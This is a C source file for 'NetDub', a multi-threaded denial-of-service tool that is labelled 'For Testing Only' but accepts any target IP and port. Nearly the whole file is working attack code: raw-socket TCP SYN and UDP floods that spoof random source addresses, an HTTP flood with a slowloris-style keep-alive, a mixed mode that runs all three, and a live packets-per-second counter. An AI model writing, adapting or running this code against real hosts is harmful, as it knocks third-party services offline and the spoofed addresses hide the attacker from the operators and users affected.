#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define MAX_THREADS 1000
#define PACKET_SIZE 1024
#define MAX_PAYLOAD 1400

// Colors
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define BLUE "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN "\033[36m"
#define RESET "\033[0m"

// Global variables
volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// Attack parameters
struct attack_params {
    char target_ip[16];
    int target_port;
    int attack_type;
    int thread_count;
    int packet_size;
    int duration;
    int intensity;
};

// Raw socket structure
struct raw_socket {
    int sock_raw;
    int sock_tcp;
    int sock_udp;
    int sock_icmp;
};

// IP Header checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    result = ~sum;
    return result;
}

// Generate random IP
char* generate_random_ip() {
    static char ip[16];
    sprintf(ip, "%d.%d.%d.%d", 
            rand() % 256, 
            rand() % 256, 
            rand() % 256, 
            rand() % 256);
    return ip;
}

// TCP SYN Flood
void* tcp_syn_flood(void* arg) {
    struct attack_params* params = (struct attack_params*)arg;
    struct raw_socket sockets;
    
    // Create raw socket
    sockets.sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockets.sock_tcp < 0) {
        perror("TCP Raw socket creation failed");
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sockets.sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed");
        return NULL;
    }
    
    char packet[PACKET_SIZE];
    struct iphdr *ip_header = (struct iphdr*)packet;
    struct tcphdr *tcp_header = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    
    unsigned long local_packets = 0;
    unsigned long local_bytes = 0;
    
    while (running) {
        memset(packet, 0, PACKET_SIZE);
        
        // IP Header
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = inet_addr(generate_random_ip());
        ip_header->daddr = dest.sin_addr.s_addr;
        ip_header->check = checksum((unsigned short*)packet, ip_header->tot_len);
        
        // TCP Header
        tcp_header->source = htons(rand() % 65535);
        tcp_header->dest = htons(params->target_port);
        tcp_header->seq = htonl(rand() % 4294967295);
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;
        
        // Send packet
        if (sendto(sockets.sock_tcp, packet, ip_header->tot_len, 0, 
                  (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            local_packets++;
            local_bytes += ip_header->tot_len;
        }
        
        // High intensity mode
        if (params->intensity > 5) {
            for (int i = 0; i < params->intensity; i++) {
                tcp_header->source = htons(rand() % 65535);
                tcp_header->seq = htonl(rand() % 4294967295);
                sendto(sockets.sock_tcp, packet, ip_header->tot_len, 0, 
                      (struct sockaddr*)&dest, sizeof(dest));
                local_packets++;
                local_bytes += ip_header->tot_len;
            }
        }
        
        // Update global stats
        if (local_packets % 1000 == 0) {
            pthread_mutex_lock(&stats_mutex);
            total_packets += local_packets;
            total_bytes += local_bytes;
            pthread_mutex_unlock(&stats_mutex);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(1); // Minimal delay for maximum speed
    }
    
    close(sockets.sock_tcp);
    return NULL;
}

// UDP Flood
void* udp_flood(void* arg) {
    struct attack_params* params = (struct attack_params*)arg;
    struct raw_socket sockets;
    
    sockets.sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockets.sock_udp < 0) {
        perror("UDP Raw socket creation failed");
        return NULL;
    }
    
    int one = 1;
    setsockopt(sockets.sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    char packet[PACKET_SIZE];
    struct iphdr *ip_header = (struct iphdr*)packet;
    struct udphdr *udp_header = (struct udphdr*)(packet + sizeof(struct iphdr));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    
    unsigned long local_packets = 0;
    unsigned long local_bytes = 0;
    
    while (running) {
        memset(packet, 0, PACKET_SIZE);
        
        // IP Header
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + params->packet_size;
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = inet_addr(generate_random_ip());
        ip_header->daddr = dest.sin_addr.s_addr;
        ip_header->check = checksum((unsigned short*)packet, ip_header->tot_len);
        
        // UDP Header
        udp_header->source = htons(rand() % 65535);
        udp_header->dest = htons(params->target_port);
        udp_header->len = htons(sizeof(struct udphdr) + params->packet_size);
        udp_header->check = 0;
        
        // Fill payload with random data
        char* payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        for (int i = 0; i < params->packet_size; i++) {
            payload[i] = rand() % 256;
        }
        
        // Send packet
        if (sendto(sockets.sock_udp, packet, ip_header->tot_len, 0, 
                  (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            local_packets++;
            local_bytes += ip_header->tot_len;
        }
        
        // Burst mode for high intensity
        if (params->intensity > 3) {
            for (int burst = 0; burst < params->intensity * 10; burst++) {
                udp_header->source = htons(rand() % 65535);
                sendto(sockets.sock_udp, packet, ip_header->tot_len, 0, 
                      (struct sockaddr*)&dest, sizeof(dest));
                local_packets++;
                local_bytes += ip_header->tot_len;
            }
        }
        
        // Update stats
        if (local_packets % 1000 == 0) {
            pthread_mutex_lock(&stats_mutex);
            total_packets += local_packets;
            total_bytes += local_bytes;
            pthread_mutex_unlock(&stats_mutex);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    close(sockets.sock_udp);
    return NULL;
}

// HTTP Flood (Application Layer)
void* http_flood(void* arg) {
    struct attack_params* params = (struct attack_params*)arg;
    
    unsigned long local_packets = 0;
    
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(params->target_port);
        dest.sin_addr.s_addr = inet_addr(params->target_ip);
        
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            char http_request[1024];
            snprintf(http_request, sizeof(http_request),
                "GET /?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: NetDub/1.0\r\n"
                "Connection: keep-alive\r\n"
                "Cache-Control: no-cache\r\n"
                "\r\n", rand(), params->target_ip);
            
            send(sock, http_request, strlen(http_request), 0);
            local_packets++;
            
            // Keep connection alive for slowloris effect
            if (params->intensity > 7) {
                char keep_alive[64];
                snprintf(keep_alive, sizeof(keep_alive), "X-a: %d\r\n", rand());
                send(sock, keep_alive, strlen(keep_alive), 0);
            }
        }
        
        close(sock);
        
        // Update stats
        if (local_packets % 100 == 0) {
            pthread_mutex_lock(&stats_mutex);
            total_packets += local_packets;
            pthread_mutex_unlock(&stats_mutex);
            local_packets = 0;
        }
    }
    
    return NULL;
}

// Statistics thread
void* stats_thread(void* arg) {
    struct attack_params* params = (struct attack_params*)arg;
    time_t start_time = time(NULL);
    
    while (running) {
        sleep(1);
        
        pthread_mutex_lock(&stats_mutex);
        unsigned long long current_packets = total_packets;
        unsigned long long current_bytes = total_bytes;
        pthread_mutex_unlock(&stats_mutex);
        
        time_t current_time = time(NULL);
        double elapsed = difftime(current_time, start_time);
        
        double pps = current_packets / elapsed;
        double mbps = (current_bytes * 8) / (elapsed * 1024 * 1024);
        
        printf("\r" CYAN "[NetDub]" RESET " PPS: " YELLOW "%.0f" RESET 
               " | Packets: " GREEN "%llu" RESET 
               " | Mbps: " MAGENTA "%.2f" RESET 
               " | Time: " BLUE "%.0fs" RESET, 
               pps, current_packets, mbps, elapsed);
        fflush(stdout);
        
        // Check duration
        if (params->duration > 0 && elapsed >= params->duration) {
            running = 0;
        }
    }
    
    return NULL;
}

// Signal handler
void signal_handler(int sig) {
    running = 0;
    printf("\n" RED "[!] Stopping attack..." RESET "\n");
}

// Check root privileges
int check_root() {
    if (geteuid() != 0) {
        printf(RED "[!] This tool requires root privileges for raw socket access" RESET "\n");
        printf(YELLOW "[*] Please run as: sudo %s" RESET "\n", program_invocation_name);
        return 0;
    }
    return 1;
}

// Main function
int main(int argc, char *argv[]) {
    // Check root
    if (!check_root()) {
        return 1;
    }
    
    // Banner
    printf(RED "╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                    " CYAN "NetDub - DDoS Tester" RED "                    ║\n");
    printf("║                    " YELLOW "Final Root Edition" RED "                      ║\n");
    printf("║                 " MAGENTA "⚠️  For Testing Only  ⚠️" RED "                 ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝" RESET "\n\n");
    
    struct attack_params params;
    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;
    
    // Input parameters
    printf(GREEN "🎯 Target IP: " RESET);
    scanf("%s", params.target_ip);
    
    printf(GREEN "🔌 Target Port: " RESET);
    scanf("%d", &params.target_port);
    
    printf(GREEN "⚡ Attack Type:\n");
    printf("   1. TCP SYN Flood (Layer 4)\n");
    printf("   2. UDP Flood (Layer 4)\n");
    printf("   3. HTTP Flood (Layer 7)\n");
    printf("   4. Mixed Attack (All Layers)\n");
    printf("   Choice: " RESET);
    scanf("%d", &params.attack_type);
    
    printf(GREEN "🧵 Threads (1-1000): " RESET);
    scanf("%d", &params.thread_count);
    if (params.thread_count > MAX_THREADS) params.thread_count = MAX_THREADS;
    
    printf(GREEN "📦 Packet Size (bytes): " RESET);
    scanf("%d", &params.packet_size);
    if (params.packet_size > MAX_PAYLOAD) params.packet_size = MAX_PAYLOAD;
    
    printf(GREEN "⏱️  Duration (seconds, 0=infinite): " RESET);
    scanf("%d", &params.duration);
    
    printf(GREEN "🔥 Intensity (1-10): " RESET);
    scanf("%d", &params.intensity);
    if (params.intensity > 10) params.intensity = 10;
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Initialize random seed
    srand(time(NULL));
    
    printf("\n" CYAN "[*] Starting attack..." RESET "\n");
    printf(YELLOW "[*] Press Ctrl+C to stop" RESET "\n\n");
    
    // Start statistics thread
    pthread_create(&stats_tid, NULL, stats_thread, &params);
    
    // Start attack threads
    for (int i = 0; i < params.thread_count; i++) {
        switch (params.attack_type) {
            case 1:
                pthread_create(&threads[i], NULL, tcp_syn_flood, &params);
                break;
            case 2:
                pthread_create(&threads[i], NULL, udp_flood, &params);
                break;
            case 3:
                pthread_create(&threads[i], NULL, http_flood, &params);
                break;
            case 4:
                // Mixed attack
                if (i % 3 == 0) {
                    pthread_create(&threads[i], NULL, tcp_syn_flood, &params);
                } else if (i % 3 == 1) {
                    pthread_create(&threads[i], NULL, udp_flood, &params);
                } else {
                    pthread_create(&threads[i], NULL, http_flood, &params);
                }
                break;
        }
        usleep(1000); // Small delay between thread creation
    }
    
    // Wait for threads to complete
    for (int i = 0; i < params.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    running = 0;
    pthread_join(stats_tid, NULL);
    
    // Final statistics
    printf("\n\n" GREEN "╔═══════════════ FINAL RESULTS ═══════════════╗" RESET "\n");
    printf(GREEN "║ " YELLOW "Total Packets: %llu" GREEN " ║" RESET "\n", total_packets);
    printf(GREEN "║ " YELLOW "Total Bytes: %llu" GREEN " ║" RESET "\n", total_bytes);
    printf(GREEN "╚═══════════════════════════════════════════════╝" RESET "\n");
    
    printf(CYAN "\n[*] Attack completed. Test your defense systems!" RESET "\n");
    
    return 0;
}
